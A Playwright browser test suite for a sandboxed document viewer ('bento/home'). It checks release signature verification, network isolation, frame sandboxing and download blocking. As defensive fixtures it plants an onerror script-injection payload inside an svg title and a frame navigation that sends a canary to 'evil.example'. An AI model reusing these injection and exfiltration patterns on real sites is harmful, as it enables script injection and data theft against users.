#!/usr/bin/env node
// SPDX-License-Identifier: MIT
// Copyright (c) 2026 The Bento authors
/**
 * bento/home in your browser, stage 1: the library, the frame page, and what
 * they let run, in a real browser.
 *
 *   PLAYWRIGHT_MODULE=…/playwright/index.mjs node scripts/test-home-web.mjs
 *   BENTO_BROWSER=webkit|firefox …   another engine (default chromium)
 *
 * Builds home/web twice against local origins (the library on 127.0.0.1, the
 * frame page on localhost: two SITES, as in production), serves both with the
 * _headers the build wrote, and drives them with real release files: the
 * frozen slides 1.2.10 shell from home/fixtures/gate1/real, with a document
 * carrying a canary. Sockets are refused for the whole run.
 *
 *   build A: the RELEASE key, the real signed 1.2.10 history bundled.
 *   build B: a throwaway key made here, the same history re-signed with it, so
 *            the rig can sign a newer history and manifest for the channel.
 *
 * Rows (design names in brackets):
 *   [T4] verification: the file's own release runs; a tampered, a forked and a
 *        newer-than-held file never run; the channel refresh is the only
 *        network, takes only a correctly signed, append-only history, and its
 *        failure changes no verdict; an unverifiable file opens read-only in
 *        the newest signed release only on request.
 *   [T2] network: every request from the library, the frame and a popup the
 *        frame opens, recorded in the browser AND at the servers, is a GET of
 *        the library, the one frame page or the release channel; no socket; no
 *        canary in any URL, header or body. Positive control: planted requests
 *        from each source are seen by both recorders.
 *   [B2/T9] the frame page refuses to boot unless opaque and framed; a foreign
 *        page cannot frame it.
 *   [B3] the frame cannot download; the library's Download gives the verified
 *        bytes.
 *   [B4] a frame that navigates itself away is closed.
 *   [T7] byte budgets.
 * Mutants: scripts/test-home-web-mutants.mjs (BENTO_HOME_WEB_MUTANT for source,
 * BENTO_HOME_WEB_DIST_MUTANT for built files).
 */
import { execFileSync } from 'node:child_process'
import { createHash, webcrypto } from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const ENGINE = process.env.BENTO_BROWSER || 'chromium'
const { startServers, freePorts } = await import(path.join(ROOT, 'home/web/serve.mjs'))
const { spliceDoc } = await import(path.join(ROOT, 'home/web/src/verify.ts'))
const { scanBlocks, executableScripts } = await import(path.join(ROOT, 'kernel/src/gate1.ts'))
const pw = await import(process.env.PLAYWRIGHT_MODULE || 'playwright')

let checks = 0, failures = 0
const ok = (c, m) => { checks++; if (!c) failures++; console.log(`  ${c ? 'ok  ' : 'FAIL'}  ${m}`) }
const note = (m) => console.log(`  note  ${m}`)
const section = (m) => console.log(`\n=== ${m}`)

const work = fs.mkdtempSync(path.join(os.tmpdir(), 'bento-home-web-'))
process.on('exit', () => fs.rmSync(work, { recursive: true, force: true }))

// --- fixtures ----------------------------------------------------------------
const REAL = path.join(ROOT, 'home/fixtures/gate1/real/slides-1.2.10')
const shell1210 = fs.readFileSync(path.join(REAL, 'Bento_Slides.bento.html'), 'utf8')
const realHistory = JSON.parse(fs.readFileSync(path.join(REAL, 'history.json'), 'utf8'))
const realPayload = JSON.parse(realHistory.payload)
const CANARY = 'BENTO-CANARY-' + webcrypto.getRandomValues(new Uint32Array(2)).join('')
const docJson = JSON.stringify({
  format: 'bento/slides', version: 1, docId: webcrypto.randomUUID(), title: CANARY, size: { w: 1280, h: 720 },
  slides: [{ id: 's1', background: '#ffffff', elements: [{ id: 't1', type: 'text', x: 96, y: 200, w: 1000, h: 120, html: 'Hello ' + CANARY, fontSize: 48, color: '#16273E' }] }],
}).replace(/</g, '\\u003c')

const hex = (s) => createHash('sha256').update(s).digest('hex')
const b64 = (s) => createHash('sha256').update(s).digest('base64')
// the loader is the executable script that inflates the runtime (the remover does not)
const loaderOf = (html) => executableScripts(scanBlocks(html)).find((b) => b.text.includes("inflate('bento-rt')"))
/** The shell with its loader's text extended by a comment: a different, still working, build. */
const withLoaderNote = (html, note) => { const b = loaderOf(html); const at = b.start + b.text.length; return html.slice(0, at) + `\n// ${note}\n` + html.slice(at) }

const deck = spliceDoc(shell1210, docJson)
const futureShell = withLoaderNote(shell1210, 'build 1.2.99')
const futureDeck = spliceDoc(futureShell, docJson)
const forkDeck = withLoaderNote(deck, 'a fork')
const tampered = (() => {
  const rt = scanBlocks(deck).find((b) => b.id === 'bento-rt')
  const at = rt.start + Math.floor(rt.text.length / 2)
  return deck.slice(0, at) + (deck[at] === 'A' ? 'B' : 'A') + deck.slice(at + 1)
})()
// a deck whose own markup carries a handler inside an svg <title> (foreign content to a
// browser, raw text to an older scanner): gate 1 refuses markup in a <title>, so it never runs
const HANDLER_PROBE = 'bento-home-web-handler'
const hostile = (probeUrl) => deck.replace('<body>', () => `<body><svg width="0" height="0"><title><img src="x" onerror="fetch('${probeUrl}')"></title></svg>`)
const bom = '\ufeff' + deck
const files = { deck, futureDeck, forkDeck, tampered, bom }
for (const [k, v] of Object.entries(files)) fs.writeFileSync(path.join(work, `${k}.bento.html`), v)
if (!deck.includes('<body>')) throw new Error('the 1.2.10 shell has no plain <body> tag to plant into')
const F = (k) => path.join(work, `${k}.bento.html`)

// the 1.2.99 history entry: same runtime, its own loader
const futureLoader = loaderOf(shell1210).text + '\n// build 1.2.99\n'
const e0 = realPayload.releases[0]
const futureEntry = {
  version: '1.2.99', sha256: hex(futureShell), at: '2026-11-09T00:00:00.000Z',
  pins: { v: 1, blocks: { ...e0.pins.blocks, loader: hex(futureLoader) }, scriptSrc: [`sha256-${b64(futureLoader)}`, e0.pins.scriptSrc[1]] },
}
const historyPlus = JSON.stringify({ ...realPayload, releases: [futureEntry, ...realPayload.releases] })

// a throwaway signing key (build B's "release key")
const kp = await webcrypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify'])
const { kty, crv, x, y } = await webcrypto.subtle.exportKey('jwk', kp.publicKey)
const testJwk = { kty, crv, x, y }
const sign = async (payload, extra = {}) => JSON.stringify({ payload, sig: Buffer.from(await webcrypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, kp.privateKey, new TextEncoder().encode(payload))).toString('base64'), ...extra })
fs.writeFileSync(path.join(work, 'test-key.json'), JSON.stringify(testJwk))
fs.writeFileSync(path.join(work, 'history-test.json'), await sign(realHistory.payload))
const SHELL_URL = 'https://bento.page/releases/slides/Bento_Slides.bento.html'
const manifestFuture = await sign(JSON.stringify({ app: 'bento-slides', version: '1.2.99', sha256: hex(futureShell), url: SHELL_URL, at: futureEntry.at }))

// --- builds ------------------------------------------------------------------
const distMutants = process.env.BENTO_HOME_WEB_DIST_MUTANT ? JSON.parse(process.env.BENTO_HOME_WEB_DIST_MUTANT) : []
async function build(name, extra) {
  const [pl, pf, pr] = await freePorts(3)
  const out = path.join(work, name)
  const o = { library: `http://127.0.0.1:${pl}`, frame: `http://localhost:${pf}`, releaseBase: `http://127.0.0.1:${pr}/releases/` }
  execFileSync(process.execPath, [path.join(ROOT, 'home/web/build.mjs'), '--out', out, '--library-origin', o.library, '--frame-origin', o.frame,
    '--release-base', o.releaseBase, ...extra], { stdio: ['ignore', 'ignore', 'inherit'] })
  for (const m of distMutants) {
    const f = path.join(out, m.file)
    const t = fs.readFileSync(f, 'utf8')
    const n = t.split(m.from).length - 1
    if (m.all ? n < 1 : n !== 1) throw new Error(`dist mutant: "${m.from}" occurs ${n} times in ${m.file}`)
    fs.writeFileSync(f, m.all ? t.split(m.from).join(m.to) : t.replace(m.from, () => m.to))
    console.log(`  mutant applied to ${name}/${m.file}`)
  }
  const info = JSON.parse(fs.readFileSync(path.join(out, 'build.json'), 'utf8'))
  if (info.mutant) console.log(`  mutant applied to ${name} source: ${info.mutant}`)
  const seen = []
  const s = await startServers({ dist: out, ports: { library: pl, frame: pf, release: pr }, onRequest: (r) => seen.push({ method: r.method, url: `http://${r.headers.host}${r.url}` }) })
  return { ...o, info, s, seen, out }
}

section(`builds (${ENGINE})`)
const A = await build('a', [])
const HANDLER_URL = `${A.releaseBase}${HANDLER_PROBE}`
fs.writeFileSync(F('hostile'), hostile(HANDLER_URL))
{
  const { Histories, judge } = await import(path.join(ROOT, 'home/web/src/verify.ts'))
  const { RELEASE_KEY } = await import(path.join(ROOT, 'home/webext/src/release.js'))
  const hs = new Histories(RELEASE_KEY, A.releaseBase, fetch)
  await hs.take(JSON.stringify(realHistory))
  const v = await judge(fs.readFileSync(F('hostile'), 'utf8'), hs.list())
  ok(v.verdict === 'unknown', `fixture: the deck with a markup handler in an svg <title> is gate-1 unknown (${v.verdict}): gate 1 refuses markup in a <title>`)
}
const B = await build('b', ['--key', path.join(work, 'test-key.json'), '--history', path.join(work, 'history-test.json')])
ok(!A.info.testKey && B.info.testKey, 'build A carries the release key, build B the throwaway test key')

// [T7] budgets: the library page without the histories it bundles, and the frame page
const BUDGET = { library: 32 * 1024, frame: 4 * 1024 }
ok(A.info.bytes.libraryWithoutHistories <= BUDGET.library, `library page ${A.info.bytes.libraryWithoutHistories} B (without bundled histories) is within ${BUDGET.library} B`)
ok(A.info.bytes.frame <= BUDGET.frame, `frame page ${A.info.bytes.frame} B is within ${BUDGET.frame} B`)
const refused = (args) => { try { execFileSync(process.execPath, [path.join(ROOT, 'home/web/build.mjs'), '--out', path.join(work, 'x'), ...args], { stdio: 'pipe' }); return false } catch { return true } }
ok(refused(['--library-origin', 'http://127.0.0.1:1']), 'the build refuses to run without a frame origin')
ok(refused(['--library-origin', 'https://home.bento.page', '--frame-origin', 'https://run.bento.page']), 'the build refuses a frame origin on the library\'s site')

// --- browser -------------------------------------------------------------------
const browser = await pw[ENGINE].launch()
const recorded = []
const sockets = []
async function context() {
  const ctx = await browser.newContext({ acceptDownloads: true })
  await ctx.routeWebSocket(/.*/, (ws) => { sockets.push(ws.url()); ws.close() })
  ctx.on('request', async (r) => {
    const e = { method: r.method(), url: r.url(), body: r.postData() ?? '', headers: '' }
    recorded.push(e)
    try { e.headers = JSON.stringify(await r.allHeaders()) } catch {}
  })
  return ctx
}
const docFrame = (page) => page.frames().find((f) => f.parentFrame() === page.mainFrame())
async function until(fn, ms = 20000) {
  const end = Date.now() + ms
  while (Date.now() < end) { try { const v = await fn(); if (v) return v } catch {} await new Promise((r) => setTimeout(r, 150)) }
  return null
}
const booted = (page) => until(async () => { const f = docFrame(page); return f && (await f.evaluate(() => !!(window.bento && window.bento.doc))) ? f : null })
const ui = (page) => page.evaluate(() => {
  const vis = (id) => { const e = document.getElementById(id); return !!e && !e.hidden && e.offsetParent !== null }
  return {
    viewing: document.body.classList.contains('viewing'), frames: document.querySelectorAll('iframe').length,
    problem: vis('problem-box') ? document.getElementById('problem').textContent : '',
    readonly: vis('readonly') ? document.getElementById('readonly').textContent : '',
    label: document.getElementById('doc-label').textContent, download: vis('download'),
    notice: vis('notice') ? document.getElementById('notice').textContent : '', status: document.getElementById('status').textContent,
  }
})
async function open(page, key) {
  await page.setInputFiles('#file', F(key))
  return until(async () => { const u = await ui(page); return u.viewing || u.problem ? u : null }, 20000)
}
const frameRequests = (X, from) => X.seen.slice(from).filter((r) => r.url.startsWith(X.frame))
const releaseRequests = (X, from) => X.seen.slice(from).filter((r) => r.url.startsWith(X.releaseBase.replace(/\/releases\/$/, '')))

// ===== [T4] build A: the release key =====================================================
section('[T4] a file runs only in its own verified release (build A, release key)')
{
  const ctx = await context()
  const page = await ctx.newPage()
  await page.goto(A.library + '/')
  A.s.files.clear() // the channel is empty: every refresh answers 404
  let mark = A.seen.length
  let u = await open(page, 'deck')
  let fr = await booted(page)
  ok(!!fr && u?.label === 'bento/slides 1.2.10', `the 1.2.10 deck boots in the frame, labelled with its release (${u?.label})`)
  if (fr) {
    const inside = await fr.evaluate(() => ({
      origin: self.origin, title: window.bento.doc.title,
      ls: (() => { try { localStorage.length; return 'open' } catch (e) { return e.name } })(),
      idb: (() => { try { indexedDB.open('x'); return 'open' } catch (e) { return e.name } })(),
      sw: (() => { try { return navigator.serviceWorker ? 'present' : 'absent' } catch (e) { return e.name } })(),
      host: typeof window.__bentoHost, identity: typeof window.__bentoIdentity, path: window.bento.loader && window.bento.loader.path,
    }))
    ok(inside.origin === 'null', `the document runs in an opaque origin (${inside.origin})`)
    ok(inside.title === CANARY, 'the document is the file\'s own (its canary title)')
    ok(inside.ls !== 'open' && inside.idb !== 'open', `the document has no storage (localStorage: ${inside.ls}, indexedDB: ${inside.idb})`)
    ok(inside.identity === 'undefined' && inside.host === 'undefined', 'no identity agent and no host store are offered to the document')
    note(`loader path ${inside.path}; service worker API present: ${inside.sw}`)
  }
  await new Promise((r) => setTimeout(r, 6000))
  ok((await ui(page)).viewing, 'positive control for [B4]: the booted document is still open after the load check (its realm answers)')
  ok(releaseRequests(A, mark).length === 0, 'a file from a bundled release costs no request to the release channel')
  ok(frameRequests(A, mark).length === 1, 'the frame page was fetched once')

  for (const [key, what] of [['tampered', 'one byte flipped in its compressed runtime'], ['forkDeck', 'a loader that is no release\'s'], ['futureDeck', 'a release newer than any held']]) {
    await page.goto(A.library + '/')
    mark = A.seen.length
    u = await open(page, key)
    ok(!!u && !u.viewing && u.frames === 0 && /not a Bento release this page can verify/.test(u.problem),
      `${what}: never runs, and says why (${(u?.problem ?? '').slice(0, 90)}…)`)
    ok(frameRequests(A, mark).length === 0, `${what}: the frame page is never even fetched`)
    ok(!u?.download, `${what}: no Download is offered`)
    ok(/read-only in the newest bento\/slides/.test(u?.readonly ?? ''), `${what}: offers to show it read-only in the newest release`)
  }
  ok(releaseRequests(A, 0).some((r) => /\/releases\/slides\/history\.json$/.test(r.url)), 'an unverifiable file makes the library refresh the histories from the channel')

  // [T4 step 6] a history signed with another key, from the channel, is refused
  A.s.files.set('/releases/slides/history.json', await sign(historyPlus, { key: testJwk }))
  await page.goto(A.library + '/')
  u = await open(page, 'futureDeck')
  ok(!!u && !u.viewing && u.frames === 0, 'a newer history signed with another key does not make the newer file run')
  // and the verdict on the file's own release is unchanged after it
  u = await open(page, 'deck')
  ok(!!(await booted(page)) && u?.label === 'bento/slides 1.2.10', 'after refusing it, the 1.2.10 deck still runs as 1.2.10')

  // [T4 step 5] the network gone: same verdicts
  await ctx.route(A.releaseBase + '**', (r) => r.abort())
  await page.goto(A.library + '/')
  u = await open(page, 'deck')
  ok(!!(await booted(page)), 'offline from the channel: the 1.2.10 deck still runs (its history is bundled)')
  u = await open(page, 'futureDeck')
  ok(!!u && !u.viewing && u.frames === 0, 'offline from the channel: the newer file still never runs')
  await ctx.close()
}

// ===== [T4] build B: the channel ================================================================
section('[T4] the channel refresh, and read-only in the newest release (build B, test key)')
{
  B.s.files.set('/releases/slides/history.json', await sign(historyPlus))
  B.s.files.set('/releases/slides/manifest.json', manifestFuture)
  B.s.files.set('/releases/slides/Bento_Slides.bento.html', futureShell)
  const ctx = await context()
  const page = await ctx.newPage()
  await page.goto(B.library + '/')
  let u = await open(page, 'futureDeck')
  let fr = await booted(page)
  ok(!!fr && u?.label === 'bento/slides 1.2.99', `positive control: a correctly signed newer history makes the newer file run (${u?.label || u?.problem})`)
  u = await open(page, 'deck')
  fr = await booted(page)
  ok(!!fr && u?.label === 'bento/slides 1.2.10', `an older file still runs in its OWN release, not the newest (${u?.label || u?.problem})`)

  // read-only in the newest release, only on request
  await page.goto(B.library + '/')
  let mark = B.seen.length
  u = await open(page, 'forkDeck')
  ok(!!u && u.frames === 0 && frameRequests(B, mark).length === 0, 'a forked file: nothing runs until the person asks')
  await page.click('#readonly')
  fr = await booted(page)
  u = await ui(page)
  const ro = fr ? await fr.evaluate(() => window.bento.doc.title) : null
  ok(!!fr && /^Read-only in bento\/slides 1\.2\.99$/.test(u.label) && ro === CANARY, `on request, its document opens in the newest signed release (${u.label})`)
  ok(!u.download, 'read-only: no Download is offered')
  ok(releaseRequests(B, mark).some((r) => r.url.endsWith('/manifest.json')) && releaseRequests(B, mark).some((r) => r.url.endsWith('.bento.html')),
    'the newest release came from the channel: the signed manifest, then the shell it pins')

  // a shell that does not match its signed pin is refused
  B.s.files.set('/releases/slides/Bento_Slides.bento.html', withLoaderNote(futureShell, 'not the pinned bytes'))
  await page.goto(B.library + '/')
  u = await open(page, 'forkDeck')
  await page.click('#readonly')
  u = await until(async () => { const v = await ui(page); return /could not be verified/.test(v.problem) ? v : null }, 15000)
  ok(!!u && u.frames === 0, `a newest shell that does not match its pin is refused, and nothing runs (${(u?.problem ?? '').slice(0, 80)})`)
  await ctx.close()
}

// ===== [T2] the network ============================================================================
section('[T2] nothing goes anywhere but the library, the frame page and the release channel')
{
  const ctx = await context()
  const page = await ctx.newPage()
  const downloads = []
  ctx.on('page', (p) => p.on('download', (d) => downloads.push(d)))
  page.on('download', (d) => downloads.push(d))
  const recFrom = recorded.length, srvFrom = A.seen.length
  A.s.files.clear()
  await page.goto(A.library + '/')
  await open(page, 'deck')
  const fr = await booted(page)
  if (!fr) ok(false, 'the deck booted for the network run')
  // present
  await fr?.click('.ed-pill-main', { timeout: 10000 }).catch(() => {})
  const presenting = await until(() => fr?.evaluate(() => !!document.querySelector('.reveal')), 8000)
  ok(!!presenting, 'present mode starts inside the frame')
  const popup = ctx.waitForEvent('page', { timeout: 6000 }).catch(() => null)
  await fr?.locator('body').press('s').catch(() => {})
  const speaker = await popup
  note(`speaker view popup from the sandboxed frame: ${speaker ? 'opened' : 'did not open'} (${ENGINE})`)
  // planted requests: each source must be seen by both recorders (positive control).
  // The popup is the speaker view, which a document opens with a gesture (a popup
  // opened from script alone is blocked, which would be no evidence either way).
  const probe = (who) => `${A.releaseBase}probe/${who}`
  await page.evaluate((u) => fetch(u).catch(() => {}), probe('library'))
  await fr?.evaluate((u) => fetch(u).catch(() => {}), probe('frame'))
  if (speaker) await speaker.evaluate((u) => fetch(u).catch(() => {}), probe('popup')).catch(() => {})
  await new Promise((r) => setTimeout(r, 1500))
  for (const who of speaker ? ['library', 'frame', 'popup'] : ['library', 'frame']) {
    const inBrowser = recorded.slice(recFrom).some((r) => r.url === probe(who))
    const atServer = A.seen.slice(srvFrom).some((r) => r.url === probe(who))
    ok(inBrowser && atServer, `positive control: a request planted in the ${who} is seen in the browser (${inBrowser}) and at the server (${atServer})`)
  }
  await fr?.locator('body').press('Escape').catch(() => {})

  // ⌘S: declined, said so, nothing written
  const before = downloads.length
  await fr?.locator('body').press('ControlOrMeta+s').catch(() => {})
  const saved = await until(async () => (await ui(page)).notice, 6000)
  ok(/Saving is not available here yet/.test(saved ?? ''), '⌘S inside the document tells the person saving is not available, and writes nothing')
  await new Promise((r) => setTimeout(r, 1000))
  ok(downloads.length === before, '⌘S produced no download')
  // [B3] the library's Download gives the verified bytes (positive control)...
  const dl = page.waitForEvent('download', { timeout: 10000 }).catch(() => null)
  await page.click('#download', { timeout: 5000 }).catch(() => {})
  const d = await dl
  const bytes = d ? fs.readFileSync(await d.path()) : null
  ok(!!bytes && bytes.equals(Buffer.from(deck)), `positive control: the library's Download gives exactly the bytes that verified (${d?.suggestedFilename()})`)
  // ...and a download started inside the frame produces no file
  const before2 = downloads.length
  await fr?.evaluate(() => {
    const a = document.createElement('a')
    a.href = URL.createObjectURL(new Blob(['<p>not from bento</p>'], { type: 'text/html' }))
    a.download = 'Q3.bento.html'
    document.body.appendChild(a)
    a.click()
  }).catch(() => {})
  await new Promise((r) => setTimeout(r, 2000))
  ok(downloads.length === before2, '[B3] a download started inside the frame produces no file')
  // some engines turn a refused download into the frame navigating to it, which the next row covers
  note(`after the refused download the document is ${(await ui(page)).viewing ? 'still open' : 'closed (the frame navigated)'} (${ENGINE})`)

  // [B4] the frame navigating itself away closes the document
  await open(page, 'deck')
  const fr2 = await booted(page)
  await fr2?.evaluate(() => { location.href = 'about:blank' }).catch(() => {})
  const closed = await until(async () => { const u = await ui(page); return !u.viewing && u.frames === 0 && /tried to leave/.test(u.problem) ? u : null }, 15000)
  ok(!!fr2 && !!closed, '[B4] a document that navigates its frame away is closed')

  // the newer file, which needs the channel
  await page.goto(A.library + '/')
  await open(page, 'futureDeck')
  await new Promise((r) => setTimeout(r, 500))
  // positive control for the socket recorder: a page with no policy opens one
  const scratch = await ctx.newPage()
  const SOCKET_PROBE = 'ws://127.0.0.1:9/bento-home-web-probe'
  await scratch.evaluate((u) => { try { new WebSocket(u) } catch {} }, SOCKET_PROBE)
  await until(() => sockets.includes(SOCKET_PROBE), 5000)
  ok(sockets.includes(SOCKET_PROBE), 'positive control: a socket opened by a page in this context is recorded')
  await ctx.close()

  const mine = recorded.slice(recFrom).filter((r) => r.url !== 'about:blank')
  const allowed = (r) => (r.method === 'GET' && (
    r.url === A.library + '/' || r.url === A.frame + '/frame.html' || r.url.startsWith(A.releaseBase))) ||
    r.url.startsWith('blob:') || r.url.startsWith('data:') || r.url === 'about:blank'
  const stray = mine.filter((r) => !allowed(r))
  ok(stray.length === 0, `every request the browser made is on the allow-list (${mine.length} recorded${stray.length ? '; stray: ' + stray.slice(0, 3).map((r) => r.method + ' ' + r.url).join(', ') : ''})`)
  const strayServer = A.seen.slice(srvFrom).filter((r) => !allowed(r))
  ok(strayServer.length === 0, `every request the servers received is on the allow-list${strayServer.length ? ': ' + strayServer.slice(0, 3).map((r) => r.method + ' ' + r.url).join(', ') : ''}`)
  const forms = [CANARY, Buffer.from(CANARY).toString('base64').slice(0, 16), encodeURIComponent(CANARY)]
  const leaks = mine.filter((r) => forms.some((c) => r.url.includes(c) || r.body.includes(c) || r.headers.includes(c)))
  ok(leaks.length === 0, `no URL, header or body carries the document's canary${leaks.length ? ': ' + leaks[0].method + ' ' + leaks[0].url : ''}`)
  const others = sockets.filter((u) => u !== SOCKET_PROBE)
  ok(others.length === 0, `no socket was opened by the library, the frame or the document (${others.join(', ') || 'none'})`)
}

// ===== [B2/T9] the frame page on its own ==============================================================
section('[B2/T9] the frame page only boots inside the library')
{
  const ctx = await context()
  const page = await ctx.newPage()
  await page.goto(A.frame + '/frame.html')
  const top = await page.evaluate(() => ({ origin: self.origin, state: document.documentElement.getAttribute('data-bento-frame'), text: document.body.innerText }))
  ok(top.origin === 'null', `navigated to directly, the frame page is still an opaque origin (its header's sandbox) (${top.origin})`)
  ok(top.state === 'refused' && /only runs inside bento\/home/.test(top.text), 'navigated to directly, it refuses to run (not framed)')
  const sw = await page.evaluate(async () => { try { return navigator.serviceWorker ? await navigator.serviceWorker.register('/frame.html').then(() => 'registered', (e) => e.name) : 'no API' } catch (e) { return e.name } })
  ok(sw !== 'registered', `no service worker can be registered on the frame site (${sw})`)
  const other = await ctx.request.get(A.frame + '/')
  ok(other.status() === 404, `the frame site serves one page: / answers ${other?.status()}`)

  // the header's sandbox directive lost (its script policy kept), framed WITHOUT a
  // sandbox attribute from the library's own origin (which frame-ancestors allows):
  // the page has a real origin, and the script's origin check must refuse
  const bare = await ctx.newPage()
  const bareBody = fs.readFileSync(path.join(A.out, 'frame/frame.html'), 'utf8')
  const policy = A.info.framePolicy.replace(/^sandbox [^;]*; /, '')
  await bare.route(A.frame + '/bare.html', (r) => r.fulfill({ contentType: 'text/html', headers: { 'content-security-policy': policy }, body: bareBody }))
  await bare.route(A.library + '/bare-host.html', (r) => r.fulfill({ contentType: 'text/html', body: `<!doctype html><iframe src="${A.frame}/bare.html"></iframe>` }))
  await bare.goto(A.library + '/bare-host.html')
  const bareFrame = await until(async () => { const f = bare.frames().find((x) => x.parentFrame() === bare.mainFrame()); return f && (await f.evaluate(() => document.documentElement.getAttribute('data-bento-frame'))) ? f : null }, 8000)
  const bareState = bareFrame ? await bareFrame.evaluate(() => ({ origin: self.origin, state: document.documentElement.getAttribute('data-bento-frame') })) : { origin: '?', state: 'did not load' }
  ok(bareState.state === 'refused', `its header without the sandbox directive, framed unsandboxed (origin ${bareState.origin}), the frame script refuses to run (${bareState.state})`)

  // a foreign page framing it, without a sandbox: frame-ancestors refuses
  A.s.files.set('/releases/evil.html', `<!doctype html><iframe id=f src="${A.frame}/frame.html"></iframe>`)
  const evil = await ctx.newPage()
  await evil.goto(A.releaseBase.replace(/\/releases\/$/, '') + '/releases/evil.html')
  await new Promise((r) => setTimeout(r, 1500))
  const child = evil.frames().find((f) => f.parentFrame() === evil.mainFrame())
  const childState = child ? await child.evaluate(() => document.documentElement.getAttribute('data-bento-frame')).catch(() => 'unreachable') : 'no frame'
  ok(childState !== 'waiting', `a foreign page cannot frame it: its script never runs there (${childState})`)
  await ctx.close()
}

// ===== [B2] the frame header lost, under the REAL library =========================================
section('[B2] a frame page that lost its header boots nothing, even framed by the library')
{
  // the deck with a markup handler in an svg <title> is refused by gate 1: never framed, handler never runs
  let ctx = await context()
  let page = await ctx.newPage()
  let mark = A.seen.length
  await page.goto(A.library + '/')
  const h = await open(page, 'hostile')
  await new Promise((r) => setTimeout(r, 1500))
  ok(!!h && !h.viewing && h.frames === 0, 'the deck with a markup handler in an svg <title> never runs (gate 1 refuses it)')
  ok(frameRequests(A, mark).length === 0, 'the deck with a markup handler: the frame page is never even fetched')
  ok(!A.seen.slice(mark).some((r) => r.url === HANDLER_URL), 'the deck with a markup handler: its handler never runs')
  await ctx.close()

  // positive control: with the header, the plain deck boots
  ctx = await context()
  page = await ctx.newPage()
  await page.goto(A.library + '/')
  await open(page, 'deck')
  const up = await booted(page)
  ok(!!up, 'positive control: with its header, the deck boots')
  await ctx.close()

  // the same page bytes WITHOUT the header, framed by the library with its sandbox attribute
  ctx = await context()
  const body = fs.readFileSync(path.join(A.out, 'frame/frame.html'), 'utf8')
  await ctx.route(A.frame + '/frame.html', (r) => r.fulfill({ contentType: 'text/html', body }))
  page = await ctx.newPage()
  await page.goto(A.library + '/')
  await open(page, 'deck')
  const state = await until(async () => { const f = docFrame(page); return f ? f.evaluate(() => document.documentElement.getAttribute('data-bento-frame') ?? (window.bento ? 'booted' : null)) : null }, 10000)
  await new Promise((r) => setTimeout(r, 2000))
  const ran = await docFrame(page)?.evaluate(() => !!window.bento).catch(() => false)
  ok(state === 'refused' && !ran, `without its header, framed by the library, the frame refuses and nothing boots (${state})`)
  await ctx.close()
}

// ===== [C4] the library's frame-src, and a byte-exact BOM ===============================================
section("the library's frame-src keeps a document's navigation off the network; a BOM survives Download")
{
  const ctx = await context()
  const evil = []
  await ctx.route('https://evil.example/**', (r) => { evil.push(r.request().url()); r.fulfill({ contentType: 'text/html', body: '<p>evil</p>' }) })
  const page = await ctx.newPage()
  await page.goto(A.library + '/')
  await open(page, 'deck')
  const fr = await booted(page)
  await fr?.evaluate((c) => { location.href = 'https://evil.example/?' + c }, CANARY).catch(() => {})
  await new Promise((r) => setTimeout(r, 7000))
  ok(!!fr && evil.length === 0, `a document navigating its frame to another site makes no request (${evil.length})`)

  await page.goto(A.library + '/')
  await open(page, 'bom')
  const up = await booted(page)
  const dl = page.waitForEvent('download', { timeout: 10000 }).catch(() => null)
  await page.click('#download', { timeout: 5000 }).catch(() => {})
  const d = await dl
  const bytes = d ? fs.readFileSync(await d.path()) : null
  ok(!!up && !!bytes && bytes.equals(Buffer.from(bom)), `a file starting with a byte-order mark boots and downloads byte for byte (${bytes?.length} of ${Buffer.byteLength(bom)})`)
  await ctx.close()
}

await browser.close()
await A.s.close(); await B.s.close()
console.log(`\n${checks - failures}/${checks} checks passed (${ENGINE})`)
process.exit(failures ? 1 : 0)
